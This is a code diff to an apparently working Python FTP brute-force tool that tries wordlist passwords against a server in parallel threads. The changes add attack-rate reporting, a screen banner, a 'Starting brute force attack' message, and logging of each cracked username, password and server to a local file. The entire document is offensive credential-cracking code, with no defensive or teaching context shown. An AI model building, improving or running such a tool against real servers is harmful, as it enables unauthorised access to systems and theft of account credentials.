@@ -2,6 +2,7 @@ import sys
 import os
 import re
 import time
+from src import layout
 import socket
 import threading  # Import threading module
 
@@ -37,17 +38,25 @@ def attempt_login(server, username, key, timeout, start):
                 print(f"Server: {server}")
                 print("<==================================>")
                 print("Ftp cracked in " + str(time.time() - start) + " seconds")
+                print("Attacks per second: " + str(len(keys) / (time.time() - start)))
+                print("Saved at attacks.txt")
                 print("\033[32mExiting...\033[0m")
+                with open("exit/attacks.txt", "a") as f:
+                    f.write(f"Username: {username}, Password: {key.strip()}, Server: {server}\n")
                 os._exit(0)  # Exit all threads immediately
             else:
-                print(f"{time.strftime('%d/%m/%y %H:%M:%S')} \033[31m Failed\033[0m to login with user: {username} and password: {key.strip()}")
+                print(f"{time.strftime('%d/%m/%y %H:%M:%S')} \033[31mFailed \033[0m to login with user: {username} and password: {key.strip()}")
         except socket.timeout:
             print(f"{time.strftime('%d/%m/%y %H:%M:%S')} \033[31mTimeout\033[0m to login with user: {username} and password: {key.strip()}")
         finally:
             s.close()
 
 try:
-    with open(f"{wordlist}.txt") as file:
+    with open(f"{wordlist}") as file:
+        os.system('clear')
+        layout.print_layout()
+        time.sleep(1)
+        print(f"Starting brute force attack on {server} using wordlist '{wordlist}'")
         start = time.time()  # Track the start time
 
         threads = []
@@ -65,7 +74,7 @@ try:
             t.join()
 
 except FileNotFoundError:
-    print(f"Wordlist file '{wordlist}.txt' not found.")
+    print(f"Wordlist file '{wordlist}' not found.")
     sys.exit(1)
 except Exception as e:
     print(f"An error occurred: {e}")
